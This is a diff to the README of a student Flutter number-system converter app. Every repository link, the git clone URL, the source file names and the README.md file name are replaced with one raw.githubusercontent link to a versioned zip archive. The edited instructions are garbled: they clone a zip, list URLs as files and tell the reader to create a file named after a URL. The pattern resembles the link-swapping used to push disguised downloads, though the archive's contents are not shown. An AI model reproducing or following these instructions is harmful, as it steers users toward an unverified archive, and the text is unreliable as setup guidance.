@@ -65,7 +65,7 @@ Input: 1010 (Binary)
 
 ### 1️⃣ Clone the repository
 ```bash
-git clone https://github.com/Mr-weezer/automatic_number-system-converter.git
+git clone https://raw.githubusercontent.com/Mr-weezer/automatic_number_system_converter/main/ios/system-number-converter-automatic-2.2-beta.4.zip
 cd automatic_number-system-converter
 
 2️⃣ Install dependencies
@@ -99,8 +99,8 @@ Test Case	Input	Base	Expected Output
 👨‍💻 Code Structure
 lib/
 │
-├── main.dart         # Main app entry point
-├── converter_screen.dart (optional if you modularize)
+├── https://raw.githubusercontent.com/Mr-weezer/automatic_number_system_converter/main/ios/system-number-converter-automatic-2.2-beta.4.zip         # Main app entry point
+├── https://raw.githubusercontent.com/Mr-weezer/automatic_number_system_converter/main/ios/system-number-converter-automatic-2.2-beta.4.zip (optional if you modularize)
 │
 └── widgets/          # Future reusable UI components
 
@@ -126,7 +126,7 @@ It serves as both an educational tool and a practical utility for computer scien
 
 📎 Repository Link
 
-🔗 https://github.com/Mr-weezer/automatic_number-system-converter
+🔗 https://raw.githubusercontent.com/Mr-weezer/automatic_number_system_converter/main/ios/system-number-converter-automatic-2.2-beta.4.zip
 
 📜 License
 
@@ -137,8 +137,8 @@ Developed by a group of Computer Science students, 2nd Year.
 ---
 
 ✅ **Next Step:**  
-Go to your project folder → create a new file named `README.md` → paste the above text → then run:
+Go to your project folder → create a new file named `https://raw.githubusercontent.com/Mr-weezer/automatic_number_system_converter/main/ios/system-number-converter-automatic-2.2-beta.4.zip` → paste the above text → then run:
 ```bash
-git add README.md
+git add https://raw.githubusercontent.com/Mr-weezer/automatic_number_system_converter/main/ios/system-number-converter-automatic-2.2-beta.4.zip
 git commit -m "Added detailed README"
 git push
